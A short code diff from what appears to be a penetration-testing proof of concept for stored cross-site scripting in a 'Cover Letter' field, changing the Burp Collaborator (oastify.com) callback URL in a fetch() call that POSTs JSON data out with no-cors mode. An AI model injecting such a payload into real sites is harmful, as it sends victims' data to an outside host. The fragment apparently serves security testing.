@@ -1,5 +1,5 @@
 // PoC máximo impacto - Stored XSS en Cover Letter
-fetch('https://d4n.4ns9654qtq8sf06wemm5nu1mvd16pydn.oastify.com/ver', {
+fetch('https://49b9s5qqfqus10sw0m859unmhdn6bzzo.oastify.com/ver', {
   method: 'POST',
   mode: 'no-cors',
   body: JSON.stringify({
